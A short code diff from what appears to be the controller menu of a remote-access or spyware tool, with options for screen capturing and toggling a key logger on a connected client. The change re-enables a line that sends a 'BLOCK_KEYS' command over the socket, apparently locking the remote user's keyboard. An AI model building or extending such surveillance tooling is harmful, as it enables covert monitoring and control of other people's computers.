@@ -77,7 +77,7 @@ def main():
         elif choice == '5':
             screen_capturing(client_socket)
         elif choice == '6':
-            # client_socket.sendall("BLOCK_KEYS".encode())
+            client_socket.sendall("BLOCK_KEYS".encode())
             break
         elif choice == '7':
             toggle_key_logger(client_socket)
